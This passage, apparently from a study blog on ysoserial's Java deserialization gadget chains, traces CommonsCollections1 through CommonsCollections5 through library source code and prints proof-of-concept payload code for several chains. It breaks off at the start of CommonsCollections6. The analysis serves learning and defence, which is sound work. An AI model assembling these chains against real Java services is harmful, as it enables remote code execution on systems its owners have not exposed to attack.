class="hljs-string">&quot;exec&quot;</span>,  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, execArgs),  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br><br>Reflections.setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br></code></pre></td></tr></table></figure><p>End.</p><h4 id="Using-TransformedMap"><a href="#Using-TransformedMap" class="headerlink" title="Using TransformedMap"></a>Using <code>TransformedMap</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>transform:<span class="hljs-number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)  <br>checkSetValue:<span class="hljs-number">169</span>, TransformedMap (org.apache.commons.collections.map)  <br>setValue:<span class="hljs-number">191</span>, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)  <br>readObject:-<span class="hljs-number">1</span>, AnnotationInvocationHandler (sun.reflect.annotation)  <br>readObject:-<span class="hljs-number">1</span>, ObjectInputStream (java.io)<br></code></pre></td></tr></table></figure><p>Look in <code>AnnotationInvocationHandler</code>‘s <code>readObject</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  <br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> s.readFields();<br>    ...<br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br><span class="hljs-keyword">try</span> &#123;  <br>    annotationType = AnnotationType.getInstance(t);  <br>&#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;  <br>    <span class="hljs-comment">// Class is no longer an annotation type; time to punch out  </span><br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);  <br>&#125;<br>...<br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br>    ...<br>    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-literal">null</span>);<br>...<br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p><code>AnnotationType.memberTypes()</code> will return the member name and type of specific annotation type, for <code>Target</code> annotation, its <code>memberTypes()</code> would return :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;value&quot;</span>: class [Ljava.lang.annotation.ElementType;<br></code></pre></td></tr></table></figure><p>There are two constraints in code above.</p><ol><li><code>streamVals</code>(which is a Map) should have an entry whose key exists in <code>annotationType</code>‘s <code>memberTypes</code> Map, for <code>Target</code>, it should be String <em>“value”</em>. Therefore, our <code>TransformedMap</code> should contain key <em>“value”</em>;</li><li><code>memberValue</code> should not be the same type as the corresponding value of <code>streamVals</code>, i.e. the value of the entry in <code>TransformedMap</code> should not falls in either <code>java.lang.annotation.ElementType</code> nor <code>ExceptionProxy</code>.<br>Transformer chain would be triggered along with the call to <code>memberValue.setValue()</code></li></ol><p>Further, look into <code>TransformedMap</code>‘s <code>entrySet</code>(which backtracks to parent <code>AbstractInputCheckedMapDecorator</code>):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Set <span class="hljs-title function_">entrySet</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">if</span> (isSetValueChecking()) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EntrySet</span>(map.entrySet(), <span class="hljs-built_in">this</span>);  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-keyword">return</span> map.entrySet();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>Follow into <code>EntrySet</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntrySet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractSetDecorator</span> &#123;<br>...<br><span class="hljs-keyword">public</span> Iterator <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EntrySetIterator</span>(collection.iterator(), parent);  <br>&#125;<br>...<br></code></pre></td></tr></table></figure><p>In <code>EntrySetIterator</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntrySetIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractIteratorDecorator</span> &#123;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;  <br>    Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry) iterator.next();  <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapEntry</span>(entry, parent);  <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>In <code>MapEntry</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapEntryDecorator</span> &#123;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;  <br>    value = parent.checkSetValue(value);  <br>    <span class="hljs-keyword">return</span> entry.setValue(value);  <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Look into <code>TransformedMap</code>‘s <code>checkSetValue</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;  <br>    <span class="hljs-keyword">return</span> valueTransformer.transform(value);  <br>&#125;<br></code></pre></td></tr></table></figure><p>As a result, when handler triggers <code>memberValue.setValue()</code>, control falls successively into the code chain above  and eventually trigger <code>transform</code> method.</p><p>End.</p><h3 id="CommonCollections2"><a href="#CommonCollections2" class="headerlink" title="CommonCollections2"></a>CommonCollections2</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 1.7<br>commons-collections:commons-collections4:4.0</p></blockquote><p>The <code>TransformingComparator</code> transforms the objects before comparison.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br><span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>PriorityQueue</code> can employ <code>TransformingComparator</code> to sort objects. In <code>readObject()</code> method:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    ...<br>    heapify();<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)  <br>        siftDown(i, (E) queue[i]);  <br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;  <br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)  <br>        siftDownUsingComparator(k, x);  <br>    <span class="hljs-keyword">else</span>        siftDownComparable(k, x);  <br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;  <br>    <span class="hljs-type">int</span> <span class="hljs-variable">half</span> <span class="hljs-operator">=</span> size &gt;&gt;&gt; <span class="hljs-number">1</span>;  <br>    <span class="hljs-keyword">while</span> (k &lt; half) &#123;  <br>        ...<br>        <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;  <br>            comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)  <br>            c = queue[child = right];  <br>        <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)  <br>            <span class="hljs-keyword">break</span>;  <br>        ...<br>    &#125;  <br>    ...  <br>&#125;<br></code></pre></td></tr></table></figure><p>Insert a <code>TemplatesImpl</code> object into priority queue and use an <code>InvokerTranformer</code> configured with <code>newTransformer</code> method to decorate the comparator. While deserialization the queue, the <code>newTransformer</code> method of <code>TemplatesImpl</code> is called and arbitrary code is executed.</p><p>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);  <br><span class="hljs-comment">// mock method name until armed  </span><br><span class="hljs-keyword">final</span> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);  <br>  <br><span class="hljs-comment">// create queue with numbers and basic comparator  </span><br><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer));  <br><span class="hljs-comment">// stub data for replacement later  </span><br>queue.add(<span class="hljs-number">1</span>);  <br>queue.add(<span class="hljs-number">1</span>);  <br>  <br><span class="hljs-comment">// switch method called by comparator  </span><br>Reflections.setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);  <br>  <br><span class="hljs-comment">// switch contents of queue  </span><br><span class="hljs-keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>);  <br>queueArray[<span class="hljs-number">0</span>] = templates;  <br>queueArray[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">return</span> queue;<br></code></pre></td></tr></table></figure><h3 id="CommonCollections3"><a href="#CommonCollections3" class="headerlink" title="CommonCollections3"></a>CommonCollections3</h3><blockquote><p>A variant of CC1, replace <code>InvokerTransformer</code> by <code>InstantiateTransformer</code></p></blockquote><blockquote><p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 7u21, reproduce on jdk7u21<br>commons-collections:commons-collections:3.2.1</p></blockquote><p>As [[Java Deserialize Vulnerabilities ysoserial study#TemplatesImpl exploit|this section]] presents, <code>TemplatesImpl</code>‘s <code>newTransformer</code> exposes an approach to loading arbitrary byte code.</p><p>Seek for reference of <code>TemplatesImpl</code>‘s <code>newTransformer</code> method, find in <code>TrAXFilter</code>‘s constructor:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span>  <br>    TransformerConfigurationException  <br>&#123;  <br>    _templates = templates;  <br>    _transformer = (TransformerImpl) templates.newTransformer();  <br>    _transformerHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);  <br>    _useServicesMechanism = _transformer.useServicesMechnism();  <br>&#125;<br></code></pre></td></tr></table></figure><p>Immediately after [[Java Deserialize Vulnerabilities ysoserial study#Proof of Concept|this code section]], proof concept above by code below:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class;  <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> cls.getDeclaredConstructor(Templates.class);  <br>constructor.setAccessible(<span class="hljs-literal">true</span>);  <br>constructor.newInstance(templates); <span class="hljs-comment">// templates is TemplatesImpl type</span><br></code></pre></td></tr></table></figure><p>This routine can be translated into the form of transformers, by introducing <code>InstantiateTransformer</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;  <br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),  <br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templates &#125; )&#125;;<br></code></pre></td></tr></table></figure><p>Use whichever payload in [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections1|CC1]] to reach the eventual payload.</p><p>End.</p><h3 id="CommonCollections4"><a href="#CommonCollections4" class="headerlink" title="CommonCollections4"></a>CommonCollections4</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 1.7<br>commons-collections:commons-collections:4.0</p></blockquote><p>This payload uses the same vulnerability as [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections2|CC2]] but uses a different exploit chain.<br>Specifically, this payload uses <code>TrAXFilter</code>, triggers transformer from its constructor.<br>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);  <br>  <br><span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">constant</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(String.class);  <br>  <br><span class="hljs-comment">// mock method name until armed  </span><br>Class[] paramTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;;  <br>Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;foo&quot;</span> &#125;;  <br><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(  <br>      paramTypes, args);  <br>  <br><span class="hljs-comment">// grab defensively copied arrays  </span><br>paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="hljs-string">&quot;iParamTypes&quot;</span>);  <br>args = (Object[]) Reflections.getFieldValue(instantiate, <span class="hljs-string">&quot;iArgs&quot;</span>);  <br>  <br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123; constant, instantiate &#125;);  <br>  <br><span class="hljs-comment">// create queue with numbers  </span><br>PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chain));  <br>queue.add(<span class="hljs-number">1</span>);  <br>queue.add(<span class="hljs-number">1</span>);  <br>  <br><span class="hljs-comment">// swap in values to arm  </span><br>Reflections.setFieldValue(constant, <span class="hljs-string">&quot;iConstant&quot;</span>, TrAXFilter.class);  <br>paramTypes[<span class="hljs-number">0</span>] = Templates.class;  <br>args[<span class="hljs-number">0</span>] = templates;  <br>  <br><span class="hljs-keyword">return</span> queue;<br></code></pre></td></tr></table></figure><h3 id="CommonCollections5"><a href="#CommonCollections5" class="headerlink" title="CommonCollections5"></a>CommonCollections5</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK &gt;&#x3D; 1.8, reproduce with JDK1.8_0382<br>commons-collections:commons-collections:3.2.1</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Gadgets chain:</span><br>transform:<span class="hljs-number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)<br>get:<span class="hljs-number">151</span>, LazyMap (org.apache.commons.collections.map)<br>getValue:<span class="hljs-number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)<br>toString:<span class="hljs-number">131</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)<br>readObject:<span class="hljs-number">86</span>, BadAttributeValueExpException (javax.management)<br>readObject:<span class="hljs-number">461</span>, ObjectInputStream (java.io)<br></code></pre></td></tr></table></figure><p>In JDK1.8, there is new restriction on <code>AnnotationInvocationHandler</code>([[Java Deserialize Vulnerabilities ysoserial study#JDK fixes|here]]), but updates to the <code>BadAttributeValueExpException</code> class can be exploited to fill the vacancy.<br><code>TiedMapEntry</code> can bind key to a specific map, any operation on this entry will be delegated to that map.</p><p>Firstly, look into <code>BadAttributeValueExpException</code>‘s <code>readObject</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();  <br>    <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);  <br>  <br>    <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;  <br>        val = <span class="hljs-literal">null</span>;  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;  <br>        val= valObj;  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>  <br>            || valObj <span class="hljs-keyword">instanceof</span> Long  <br>            || valObj <span class="hljs-keyword">instanceof</span> Integer  <br>            || valObj <span class="hljs-keyword">instanceof</span> Float  <br>            || valObj <span class="hljs-keyword">instanceof</span> Double  <br>            || valObj <span class="hljs-keyword">instanceof</span> Byte  <br>            || valObj <span class="hljs-keyword">instanceof</span> Short  <br>            || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;  <br>        val = valObj.toString();  <br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix  </span><br>        val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>Its <code>val</code> member could be any type assigned by constructor. Here we can see a constraint that <code>System.getSecurityManager()</code> should be null. Note that, in former JDK version(&lt;1.8), <code>BadAttributeValueExpException</code> have not override <code>readObject</code> so it’s not vulnerable.</p><p>Step into <code>TiedMapEntry</code>‘s <code>toString()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">&quot;=&quot;</span> + getValue();  <br>&#125;<br><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">return</span> map.get(key);  <br>&#125;<br></code></pre></td></tr></table></figure><p><code>toString()</code> will call <code>getValue()</code> and call <code>map.get()</code>, satisfying <code>LazyMap</code>‘s constraint.</p><p>So here comes the Poc(partial):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);  <br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;foo&quot;</span>);  <br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);  <br><span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);  <br>      Reflections.setAccessible(valfield);  <br>valfield.set(val, entry);<br>...<br></code></pre></td></tr></table></figure><p>End.</p><h3 id="CommonCollections6-jdk1-8-1-7"><a href="#CommonCollections6-jdk1-8-1-7" class="headerlink" title="CommonCollections6 jdk1.8 1.7"></a>CommonCollections6 jdk1.8 1.7</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK1.7 or 1.8, reproduce successful on both<br>commons-collections:commons-collections:3.2.1</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code 